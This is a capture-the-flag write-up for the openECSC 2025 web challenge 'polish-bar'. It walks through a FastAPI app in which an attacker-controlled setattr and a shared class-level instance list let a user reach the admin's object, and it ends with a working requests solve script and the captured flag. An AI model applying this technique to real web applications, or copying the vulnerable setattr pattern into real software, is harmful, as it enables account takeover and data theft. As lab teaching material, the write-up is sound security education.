---
title: "openESEC 2025 - web/polish-bar"
layout: single
classes: wide
date: 2025-10-06
categories: blog
---

> This Web Application was made to adapt to Polish (drinking) culture :3

In this challenge, we're presented with a Python-based web application. The goal is to find a way to access the admin's session and retrieve the flag. The application allows users to register, log in, and manage their beverage preferences. The vulnerability lies in how the application handles object properties, allowing for a clever manipulation of the session data to impersonate the admin. This write-up will walk through the process of discovering and exploiting this vulnerability.

# The Scene

Upon registering and logging in, we're greeted with a profile page where we can manage our `beverage configuration`. We can add new beverages to our `alcohol_shelf`, update our configuration, or empty the shelf. The application seems simple on the surface, but the way it handles these configurations under the hood is where things get interesting.

## Frontend

We have a frontend serving some `Jinja` templates that has some HTTP endpoints we can use to ~~get hella drunk~~ understand what the Polish bar has to offer. All endpoints somewhat modify the `BeverageConfig` of our account. There is an admin account that has the flag:

```py
app = FastAPI()
templates = Jinja2Templates(directory="templates")
sessions = {}

def admin_session_setup():
    session_id = str(uuid.uuid4())

    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }

admin_session_setup()


@app.get("/")
...

@app.get("/register")
...

@app.post("/register")
async def post_register(request: Request, username: str = Form(...), password: str = Form(...)):

    new_session_id = str(uuid.uuid4())

    sessions[new_session_id] = { 'username': username, 'password': password, 'config': BeverageConfig(None) }

    response = RedirectResponse(url="/profile", status_code=303)
    response.set_cookie(key="session", value=new_session_id, HTTPonly=True)
    return response


@app.get("/profile")
async def get_profile(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/config")
async def update_config(request: Request, config: str = Form(...), value: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        err = sessions[session_id]['config'].update_property(config, value)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config(),
            "error": 'Beverage is not in your shelf!' if err else ''
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/beverage")
async def update_config(request: Request, beverage: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].add_beverage(beverage)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/empty")
async def update_config(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].empty_alcohol_shelf()

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)
```

The `/register` HTTP endpoint is important for obtaining a session. Afterwards, we have the `/config`, `/empty`, and `/beverage` endpoints, which map to methods in the `BeverageConfig` class.


## Backend

Here, we map the http endpoint to the methods of the class `BeverageConfig`. It's parent class is `PreferenceConfig` which has the class variable `_all_instances`. It's a list that stores every object created from a class inheriting `PreferenceConfig`. If you are unfamiliar with those, check out the [playground](#the-playground). 

```py
class PreferenceConfig(AlcoholShelf):
    _all_instances = []
    
    def __init__(self, preferred_beverage: str):
        super().__init__()
        self.preferred_beverage = preferred_beverage
        self.alcohol_shelf = AlcoholShelf()
        self.blood_alcohol_level = 1.0
        BeverageConfig._all_instances.append(self)

    ...

class BeverageConfig(PreferenceConfig):

    def __init__(self, preferred_beverage: str):
        super().__init__(preferred_beverage)
        self.preferred_beverage = preferred_beverage
        self.blood_alcohol_level = 1.0
```

The endpoint `\beverage` maps to the method below:

```py
    # /beverage
    def add_beverage(self, beverage: str):
        self.alcohol_shelf._alcohol_shelf.append(beverage)
```

The next piece of the puzzle was the `/config` endpoint, which calls the `update_property` method.

```py
    # /config
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)
        if attr:
            setattr(self, key, attr)
            return
        return { 'error': 'property doesn\'t exist!' }
```

The `empty_alcohol_shelf` of the class `PreferenceConfig` reduces a list to its first element or unwraps a list into its first element.

```py
    # /empty 
    def empty_alcohol_shelf(self):
        if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
            self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
        else:
            self.alcohol_shelf = self.alcohol_shelf[0]
```

# The Detective

Below is a small playground I created if you want to try it on your own first. If you are not familiar with the special methods `getattr`, `setattr`, and `hasattr`---I've got you covered! At the end, I included the challenge classes so that you can play around and try to solve this CTF on your own. You can use the [hints](#intuition).

<iframe
  src="https://bluuuk.github.io/blog-jupyterlite/lab/index.html?path=/openECSC-playground.ipynb"
  id="jupyterlite"
  width="100%"
  height="1000px"
  tabindex="-1">
</iframe>

## The Evidence

For those who want to find the solution on their own, here's a trail of hints that follows the logic of the exploit. Do not scroll too far, otherwise you will see the solution. Click as you like:

{% capture hint1 %}
The key vulnerability lies in a class variable that is shared across all instances of the `BeverageConfig` object. Can you find it in the `PreferenceConfig` parent class?
{% endcapture %}

<details>
  <summary>Hint 1)</summary>
  {{ hint1 | markdownify }}
</details>

{% capture hint2 %}
The `_all_instances` list contains every user's object, including the admin's. The admin's object is always the first element. How can we get a reference to this list?
{% endcapture %}

<details>
  <summary>Hint 2)</summary>
  {{ hint2 | markdownify }}
</details>

{% capture hint3 %}
The `/config` endpoint lets us call `update_property`. This method allows us to set an attribute on our object to the value of another attribute. This is our ticket to accessing `_all_instances`.
{% endcapture %}

<details>
  <summary>Hint 3)</summary>
  {{ hint3 | markdownify }}
</details>

{% capture hint4 %}
With the previous hint in mind, we can set our `alcohol_shelf` to point to `_all_instances`. Now, `alcohol_shelf` is no longer an `AlcoholShelf` object—it's a list containing both the admin's and our objects.
{% endcapture %}

<details>
  <summary>Hint 4)</summary>
  {{ hint4 | markdownify }}
</details>

{% capture hint5 %}
Our `alcohol_shelf` is now a list: `[admin_object, our_object]`. The `/empty` endpoint is designed to reduce the shelf to its first element. What happens when we call it now?
{% endcapture %}

<details>
  <summary>Hint 5)</summary>
  {{ hint5 | markdownify }}
</details>

{% capture hint6 %}
After calling `/empty`, our `alcohol_shelf` now points directly to the admin's object. Visiting our profile page should now reveal the admin's data, including the flag.
{% endcapture %}

<details>
  <summary>Hint 6)</summary>
  {{ hint6 | markdownify }}
</details>

# The Weapon

With the all information on the table, the attack plan became clear:

1.  Use `update_property` to set our object's `alcohol_shelf` attribute to point to the `_all_instances` list.
2.  Now our `alcohol_shelf` is no longer an `AlcoholShelf` object, but a list containing `[admin_object, our_object]`.
3.  Call the `/empty` endpoint, which triggers `empty_alcohol_shelf`. This method is designed to reduce the shelf to its first element. In our case, `AlcoholShelf = admin_object` is the final result.
4.  Finally, when we visit our `/profile`, the server will try to display our `alcohol_shelf`, which now points directly to the admin's object, revealing the flag.

This is a classic prototype pollution-style vulnerability. We can set any attribute (`key`) on our `BeverageConfig` object to the value of any other attribute (`val`) we can access. This was the perfect tool to create a reference to the `_all_instances` list on our own object.

This section includes the final solution and a step-by-step visualization with [Python Tutor](https://pythontutor.com/python-compiler.html#). Feel free to go there and play with the tool. The final solution is therefore:

```py
Solve = BeverageConfig(None)
Solve.update_property(
    "alcohol_shelf","_all_instances"
)
Solve.empty_alcohol_shelf()
Solve.get_config()
```

## Create our own `BeverageConfig`

![Step 1](/assets/images/2025-10-06-openESEC-web-polish-bar/step1.png)

## Update the `alcohol_shelf` attribute

![Step 2](/assets/images/2025-10-06-openESEC-web-polish-bar/step2.png)

## Use empty to shorten the list to its first element

![Step 3](/assets/images/2025-10-06-openESEC-web-polish-bar/step3.png)

## Calling `get_config`

The green arrow shows the last executed line, whereas the red arrow is for the current one. 

![Step 4](/assets/images/2025-10-06-openESEC-web-polish-bar/step4.png)

## `self.get_property('preferred_beverage')` points to the flag

![Step 5](/assets/images/2025-10-06-openESEC-web-polish-bar/step5.png)

# The Verdict

We use a `Session` which automatically attaches the cookie to subsequent HTTP requests once set.

```py
import requests
session = requests.Session()
base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

session.post( f"{base}/register", data={"username":"admin","password":"lol"})
session.post(f"{base}/config",data={"config":"alcohol_shelf","value":"_all_instances"})
session.post(f"{base}/empty")
print(session.post(f"{base}/profile"))
```

Executing our solve script gives us our well-deserved flag. :)

```bash
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
```